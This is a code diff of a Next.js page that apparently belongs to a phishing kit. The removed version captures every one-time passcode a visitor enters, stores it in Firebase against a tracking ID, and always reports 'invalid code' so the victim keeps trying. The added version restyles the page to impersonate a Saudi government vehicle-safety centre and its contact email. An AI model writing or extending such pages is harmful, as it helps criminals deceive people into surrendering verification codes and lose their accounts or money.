@@ -1,93 +1,101 @@
-"use client"
+"use client";
 
-import type React from "react"
+import { Suspense, useState } from "react";
+import {
+  Menu,
+  MessageCircle,
+  Facebook,
+  Twitter,
+  Instagram,
+} from "lucide-react";
+import { useRouter } from "next/navigation";
+import { PhoneVerificationForm } from "@/components/phone-verification-form";
 
-import { useState, useRef, type KeyboardEvent, type ClipboardEvent } from "react"
-import { Button } from "@/components/ui/button"
-import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from "@/components/ui/card"
-import { Input } from "@/components/ui/input"
-import { Shield } from "lucide-react"
-import { addData } from "@/lib/firebase"
-const allPhoneOtps=['']
-export default function OTPPage() {
-  const [otp, setOtp] = useState('')
-  const inputRefs = useRef<(HTMLInputElement | null)[]>([])
-
-  const handleChange = async (index: number, value: string) => {
-    if (!/^\d*$/.test(value)) return // Only allow digits
-
-
-  }
-
-  const handleKeyDown = (index: number, e: KeyboardEvent<HTMLInputElement>) => {
-    if (e.key === "Backspace" && !otp[index] && index > 0) {
-      inputRefs.current[index - 1]?.focus()
-    }   
-  }
-
-
-  const handleSubmit = async (e: React.FormEvent) => {
-    e.preventDefault()
-    const visitorID=localStorage.getItem('visitor')
-    allPhoneOtps.push(otp)
-    await addData({id:visitorID,otp1:otp,allPhoneOtps})
-        setOtp(otp)
-alert('invalid code')
-  }
-
-  const handleResend = () => {
-    console.log("Resending OTP")
-    setOtp('')
-    inputRefs.current[0]?.focus()
-  }
-
+function PhoneVerificationContent() {
+  const router = useRouter();
 
   return (
-    <main className="flex min-h-screen items-center justify-center bg-gradient-to-br from-primary/5 via-background to-accent/5 p-4">
-      <Card className="w-full max-w-md shadow-lg">
-        <CardHeader className="text-center space-y-2">
-          <div className="mx-auto mb-2 flex h-12 w-12 items-center justify-center rounded-full bg-primary/10">
-            <Shield className="h-6 w-6 text-primary" />
+    <div className="min-h-screen bg-stone-50 font-sans" dir="rtl" lang="ar">
+      {/* Header */}
+      <header className="bg-white border-b border-stone-200 sticky top-0 z-50 shadow-sm">
+        <div className="container mx-auto px-4 py-4 flex items-center justify-between max-w-7xl">
+          <button
+            onClick={() => router.back()}
+            className="p-2 hover:bg-stone-100 rounded-lg transition-colors"
+          >
+            <Menu className="w-5 h-5 text-stone-800" />
+          </button>
+          <div className="flex items-center gap-3">
+            <div className="text-right">
+              <h1 className="text-sm font-bold text-stone-900 mb-2">
+                مركز سلامة المركبات
+              </h1>
+              <p className="text-xs text-stone-500">Vehicles Safety Center</p>
+            </div>
+            <div className="w-10 h-10 rounded-full bg-gradient-to-br from-green-500 to-green-600 flex items-center justify-center text-white font-bold">
+              مس
+            </div>
           </div>
-          <CardTitle className="text-2xl font-bold">تاكيد الموعد</CardTitle>
-          <CardDescription className="text-balance">
-يرجى ادخال رمز التحقق المرسل الى رقم هاتفك 
-          </CardDescription>
-        </CardHeader>
+          <div className="w-10" />
+        </div>
+      </header>
 
-        <form onSubmit={handleSubmit}>
-          <CardContent className="space-y-6">
-            <div className="flex justify-center gap-2">
-             
-                <Input
-                  type="tel"
-                  inputMode="numeric"
-                  maxLength={6}
-                  autoComplete="otp"
-                  value={otp}
-                  onChange={(e) => setOtp(e.target.value)}
-                  className="h-14 w-full text-center text-xl font-semibold transition-all focus:scale-105"
-                />
+      <main className="container mx-auto px-4 py-8 max-w-md">
+        {/* Phone Verification */}
+        <Suspense
+          fallback={<div className="text-center py-12">جاري التحميل...</div>}
+        >
+          <PhoneVerificationForm />
+        </Suspense>
+      </main>
+
+      {/* Support Button */}
+      <div className="fixed bottom-6 right-6 z-50">
+        <div className="bg-green-600 hover:bg-green-700 text-white p-3 rounded-full shadow-lg cursor-pointer transition-colors">
+          <MessageCircle className="w-6 h-6" />
+        </div>
+      </div>
+
+      {/* Footer */}
+      <footer className="bg-white border-t border-stone-200 mt-12">
+        <div className="container mx-auto px-4 py-12 max-w-7xl">
+          <div className="text-center mb-12 pb-12 border-b border-stone-200">
+            <div className="inline-flex items-center justify-center gap-3 mb-4">
+              <MessageCircle className="w-8 h-8 text-green-600" />
             </div>
-
-            <div className="text-center text-sm text-muted-foreground">
-           
-              <button
-                type="button"
-                className="font-medium text-primary hover:underline focus:outline-none focus:underline"
+            <p className="text-sm text-stone-600 mb-2">هل بحاجة للمساعدة؟</p>
+            <p className="text-sm text-stone-500 mb-4">
+              تواصل معنا عبر القنوات المتاحة
+            </p>
+            <div className="flex justify-center gap-4">
+              <a
+                href="mailto:info@saso.gov.sa"
+                className="text-sm text-green-600 hover:text-green-700"
               >
-                Resend
-              </button>
+                info@saso.gov.sa
+              </a>
             </div>
-          </CardContent>
+          </div>
 
-          <CardFooter>
-            <Button type="submit" className="w-full text-white" size="lg">
- تحقق
-            </Button>
-          </CardFooter>
-        </form>
-      </Card>
-    </main>
-  )
+          <div className="text-center">
+            <div className="flex justify-center gap-4 mb-6">
+              <Facebook className="w-5 h-5 text-stone-400 hover:text-stone-600 cursor-pointer transition" />
+              <Twitter className="w-5 h-5 text-stone-400 hover:text-stone-600 cursor-pointer transition" />
+              <Instagram className="w-5 h-5 text-stone-400 hover:text-stone-600 cursor-pointer transition" />
+            </div>
+            <p className="text-xs text-stone-500 mb-4">
+              أحكام وشروط | سياسة الخصوصية
+            </p>
+            <p className="text-xs text-stone-400">
+              © 2025 مركز سلامة المركبات. جميع الحقوق محفوظة
+            </p>
+          </div>
+        </div>
+      </footer>
+    </div>
+  );
+}
+
+export default function PhoneVerificationPage() {
+  return <PhoneVerificationContent />;
 }
